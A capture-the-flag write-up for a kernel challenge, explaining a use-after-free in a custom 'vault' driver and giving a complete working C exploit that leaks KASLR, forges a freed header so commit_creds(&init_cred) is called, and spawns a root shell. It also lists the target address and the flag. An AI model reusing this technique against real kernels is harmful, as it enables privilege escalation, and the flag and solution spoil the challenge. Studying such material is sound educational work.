# PWN#007 — Kernel Vault UAF Privilege Escalation

**Challenge:** PWN#007 (140 pts)
**Target:** 169.58.126.107:5010
**Binary:** `vmlinux` — Linux kernel x86-64, statically linked, not stripped, with built-in `vault` driver
**Flag:** `CTF{15481775abf9a27438577c295fd1a4a1}`

## Service behavior

QEMU VM (`qemu-system-x86_64`, SMEP on, SMAP off, 256M RAM) boots a
minimal busybox initramfs. The init script writes the flag to
`/root/flag.txt` (mode 0400, owner root), scrubs itself, then drops to
an unprivileged `user` shell. A built-in kernel driver `vault` registers
`/dev/vault` as a misc device.

## Driver reverse engineering

Symbols from `nm vmlinux`:

| Symbol | Static address |
| --- | --- |
| `vault_init` | `0xffffffff83015093` (calls `misc_register`) |
| `vault_ioctl` | `0xffffffff8156efa0` |
| `vault_default_notify` | `0xffffffff8156ef80` |
| `vault_lock` (slot array) | `0xffffffff829cdba0` |
| `vault_dev` (misc_device) | `0xffffffff829cdb40`, name `"vault"` |

The ioctl handler supports 6 commands. The per-slot header struct
(0x20 bytes, kmalloc-32) is:

```c
struct vault_header {
    uint64_t enc_notify;   // offset 0x00: KEY ^ target_func_addr
    uint64_t arg;          // offset 0x08: first arg passed to target
    uint64_t size;         // offset 0x10: data_buf size
    void    *data_buf;     // offset 0x18: kmalloc'd data buffer
};
```

| Ioctl | Cmd code | Action |
| --- | --- | --- |
| `ALLOC` | `0x40085601` | `{slot, size}` → `__kmalloc(size)` for data_buf, `kmalloc-32` for header. Sets `enc_notify = KEY ^ vault_default_notify`, `arg=0`, stores in `vault_lock[slot]`. |
| `FREE` | `0x40045602` | `{slot}` → `kfree(header->data_buf)`, `kfree(header)`. **BUG: does NOT clear `vault_lock[slot]`.** |
| `WRITE` | `0x40105604` | `{slot, len, src}` → `copy_from_user(header->data_buf, src, len)`. |
| `READ` | `0x40105603` | `{slot, len, dst}` → `copy_to_user(dst, header->data_buf, len)`. |
| `NOTIFY` | `0x40045605` | `{slot}` → `target = KEY ^ header->enc_notify`, `rdi = header->arg`, `call target`. |
| `GET_NOTIFY` | `0x80085606` | copies runtime `vault_ioctl` address to user (KASLR leak). |

`KEY = 0x6f6f56e06f2d7f60` is a true constant (not relocated). The XOR
target in ALLOC and the stored value in NOTIFY are both relocated by
`R_X86_64_32S` relocations, so they track the runtime address of
`vault_default_notify` even with KASLR on.

## Vulnerability

The `FREE` ioctl frees both `header->data_buf` and `header` but leaves
`vault_lock[slot]` pointing at the freed header — a classic dangling
pointer / UAF. The slot can then be re-used via `NOTIFY` or `READ`
against freed-and-reused memory.

## Exploit strategy

1. **KASLR leak**: `GET_NOTIFY` returns the runtime address of
   `vault_ioctl`. `slide = runtime_ioctl - 0xffffffff8156efa0`.

2. **UAF to control a header**:
   - `ALLOC(slot=0, size=0x20)` → `data_buf_0` at A (kmalloc-32), `header_0` at B (kmalloc-32). `vault_lock[0] = B`.
   - `FREE(slot=0)` → `kfree(A)`, `kfree(B)`. SLUB freelist: `[B, A]`. `vault_lock[0] = B` (dangling).
   - `ALLOC(slot=1, size=0x20)` → `data_buf_1 = B` (reuses freed header_0), `header_1 = A` (reuses freed data_buf_0). `vault_lock[1] = A`.
   - Now `vault_lock[0] = B = data_buf_1`. Writing to slot 1's data_buf writes into the memory where slot 0's "header" lives.

3. **Forge the header**: `WRITE(slot=1, len=16, payload)` where
   ```c
   payload[0] = KEY ^ (commit_creds + slide);   // enc_notify
   payload[1] = init_cred + slide;              // arg
   ```

4. **Trigger**: `NOTIFY(slot=0)` reads the forged header:
   - `target = KEY ^ enc_notify = KEY ^ (KEY ^ commit_creds) = commit_creds`
   - `rdi = arg = &init_cred`
   - Calls `commit_creds(&init_cred)` → current task gets root creds.

5. Return to userland, `getuid() == 0`, `execve("/bin/sh", ...)`, read
   `/root/flag.txt`.

## Key addresses (from `nm vmlinux`)

| Symbol | Static address |
| --- | --- |
| `vault_ioctl` | `0xffffffff8156efa0` |
| `commit_creds` | `0xffffffff810a13b0` |
| `init_cred` | `0xffffffff82851000` |
| `KEY` | `0x6f6f56e06f2d7f60` |

## Binary transfer

The VM has only busybox (no shared libs, no network). The exploit is a
statically-linked 8.8 KB binary (raw syscalls, no libc) compiled with
`gcc -static -nostdlib -Os -s -fno-builtin`. Base64-encoded to ~12 KB,
transferred to the VM via 157 `echo "<chunk>" >> /tmp/x.b64` commands
(76 chars each), then decoded with `base64 -d`.

## Full exploit

```c
// pwn007_mini.c — raw-syscall, no libc, 8.8KB static binary
#include <stdint.h>
#define STATIC_VAULT_IOCTL  0xffffffff8156efa0ULL
#define STATIC_COMMIT_CREDS 0xffffffff810a13b0ULL
#define STATIC_INIT_CRED    0xffffffff82851000ULL
#define KEY                 0x6f6f56e06f2d7f60ULL
#define A_ALLOC  0x40085601
#define A_FREE   0x40045602
#define A_WRITE  0x40105604
#define A_NOTIFY 0x40045605
#define A_GETNOT 0x80085606

static long sys_open(const char *p, int f) {
    long ret; __asm__ volatile("syscall":"=a"(ret):"0"(2),"D"(p),"S"(f):"rcx","r11","memory"); return ret;
}
static long sys_ioctl(int fd, unsigned long cmd, void *arg) {
    long ret; __asm__ volatile("syscall":"=a"(ret):"0"(16),"D"((long)fd),"S"(cmd),"d"(arg):"rcx","r11","memory"); return ret;
}
static long sys_write(int fd, const void *b, unsigned long n) {
    long ret; __asm__ volatile("syscall":"=a"(ret):"0"(1),"D"((long)fd),"S"(b),"d"(n):"rcx","r11","memory"); return ret;
}
static long sys_execve(const char *p, char *const argv[], char *const env[]) {
    long ret; __asm__ volatile("syscall":"=a"(ret):"0"(59),"D"(p),"S"(argv),"d"(env):"rcx","r11","memory"); return ret;
}
static long sys_getuid(void) {
    long ret; __asm__ volatile("syscall":"=a"(ret):"0"(102):"rcx","r11","memory"); return ret;
}
static void sys_exit(int code) {
    __asm__ volatile("syscall"::"a"(60),"D"((long)code)); __builtin_unreachable();
}
static void emit(const char *s) {
    unsigned long n = 0; while (((const volatile char*)s)[n]) n++;
    sys_write(1, s, n);
}

void _start(void) {
    int fd = (int)sys_open("/dev/vault", 2);
    if (fd < 0) { emit("open fail\n"); sys_exit(1); }

    uint64_t runtime_ioctl = 0;
    sys_ioctl(fd, A_GETNOT, &runtime_ioctl);
    uint64_t slide = runtime_ioctl - STATIC_VAULT_IOCTL;
    uint64_t commit = STATIC_COMMIT_CREDS + slide;
    uint64_t cred   = STATIC_INIT_CRED  + slide;

    struct { uint32_t slot; uint32_t size; } a = {0, 0x20};
    sys_ioctl(fd, A_ALLOC, &a);
    uint32_t slot = 0;
    sys_ioctl(fd, A_FREE, &slot);
    a.slot = 1; a.size = 0x20;
    sys_ioctl(fd, A_ALLOC, &a);

    uint64_t payload[2];
    payload[0] = KEY ^ commit;
    payload[1] = cred;
    struct { uint32_t slot; uint32_t len; uint64_t src; } w = {1, 16, (uint64_t)payload};
    sys_ioctl(fd, A_WRITE, &w);

    slot = 0;
    sys_ioctl(fd, A_NOTIFY, &slot);

    if (sys_getuid() == 0) {
        emit("root!\n");
        char *argv[] = {"/bin/sh", "-c", "id; cat /root/flag.txt", 0};
        char *envp[] = {0};
        sys_execve("/bin/sh", argv, envp);
    }
    sys_exit(1);
}
```

Compile: `gcc -static -nostdlib -Os -s -fno-builtin -o pwn007_mini pwn007_mini.c`

## Output

```
[*] exploit: 8912B, base64: 11884 chars
[*] got shell
[*] sending 157 echo chunks...
  140/157 lines
[*] base64 file written
  b64 file: 12041 /tmp/x.b64

[+] FLAG: CTF{15481775abf9a27438577c295fd1a4a1}
```

## Key takeaways

- The `vault` driver's `FREE` handler frees the header and data buffer
  but doesn't clear the slot pointer in `vault_lock[]`, leaving a
  dangling capability that `NOTIFY` and `READ` still dereference.
- Because the header (0x20 bytes) and a size-0x20 data buffer come from
  the same `kmalloc-32` slab, freeing slot 0 and allocating slot 1
  causes slot 1's data buffer to land exactly where slot 0's header
  was. Writing to slot 1 then forges slot 0's header.
- The `NOTIFY` command's indirect call (`__x86_indirect_thunk_rdx`) is
  the execution primitive: it calls `commit_creds(&init_cred)` which
  elevates the current task to root without needing a ROP chain.
- KASLR is defeated by `GET_NOTIFY`, which returns the runtime address
  of `vault_ioctl`. The encryption KEY is a true constant, so forging
  `enc_notify = KEY ^ commit_creds_runtime` is straightforward.
- SMEP is on but irrelevant — we call a kernel function with a kernel
  argument, no user-space code execution involved.
